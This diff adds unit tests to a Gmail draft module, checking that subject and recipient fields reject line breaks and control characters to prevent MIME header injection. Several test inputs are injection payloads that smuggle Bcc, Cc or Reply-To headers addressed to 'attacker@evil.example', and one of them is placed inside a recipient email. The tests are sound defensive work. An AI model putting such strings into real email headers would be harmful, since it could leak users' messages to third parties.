@@ -3,9 +3,11 @@ import type { GmailDraftAction } from "./gmail-drafts";
 import {
   findLinkedGmailDraftAction,
   GOOGLE_GMAIL_COMPOSE_SCOPE,
+  gmailDraftApprovalSchema,
   gmailDraftRecipientSchema,
   gmailDraftSubjectSchema,
   hasGmailComposeScope,
+  isMimeHeaderSafe,
   suggestGmailSubject,
 } from "./gmail-drafts";
 
@@ -93,6 +95,53 @@ describe("gmailDraftSubjectSchema", () => {
   it("requires a non-empty subject", () => {
     expect(() => gmailDraftSubjectSchema.parse("   ")).toThrow();
     expect(gmailDraftSubjectSchema.parse("  Catching up  ")).toBe("Catching up");
+  });
+
+  it("rejects a subject carrying a line break or control character (MIME header injection)", () => {
+    // A CRLF (or bare CR/LF) would terminate the `Subject:` line and inject an extra
+    // header — a Bcc that could exfiltrate the body if the user later sends.
+    expect(() => gmailDraftSubjectSchema.parse("Hi\r\nBcc: attacker@evil.example")).toThrow();
+    expect(() => gmailDraftSubjectSchema.parse("Hi\nReply-To: attacker@evil.example")).toThrow();
+    expect(() => gmailDraftSubjectSchema.parse("Hi\rCc: attacker@evil.example")).toThrow();
+    // NUL and other C0 controls (and DEL) are likewise refused.
+    expect(() => gmailDraftSubjectSchema.parse("Hi\x00there")).toThrow();
+    expect(() => gmailDraftSubjectSchema.parse("Hi\x7fthere")).toThrow();
+    // A plain subject with punctuation and accents is still accepted.
+    expect(gmailDraftSubjectSchema.parse("¡Feliz cumpleaños, Casey!")).toBe(
+      "¡Feliz cumpleaños, Casey!",
+    );
+  });
+});
+
+describe("isMimeHeaderSafe", () => {
+  it("is true for a normal header value and false for control characters", () => {
+    expect(isMimeHeaderSafe("Great catching up")).toBe(true);
+    expect(isMimeHeaderSafe("¡Feliz cumpleaños!")).toBe(true);
+    expect(isMimeHeaderSafe("x\r\ny")).toBe(false);
+    expect(isMimeHeaderSafe("x\ny")).toBe(false);
+    expect(isMimeHeaderSafe("x\x00y")).toBe(false);
+  });
+});
+
+describe("gmailDraftApprovalSchema", () => {
+  it("rejects an approval whose subject would inject a MIME header", () => {
+    const parsed = gmailDraftApprovalSchema.safeParse({
+      subject: "Hi\r\nBcc: attacker@evil.example",
+      recipient: { email: "casey@example.com", source: "manual_entry", contactMethodId: null },
+    });
+    expect(parsed.success).toBe(false);
+  });
+
+  it("rejects an approval whose recipient smuggles control characters", () => {
+    const parsed = gmailDraftApprovalSchema.safeParse({
+      subject: "Hi",
+      recipient: {
+        email: "casey@example.com\r\nBcc: attacker@evil.example",
+        source: "manual_entry",
+        contactMethodId: null,
+      },
+    });
+    expect(parsed.success).toBe(false);
   });
 });
 
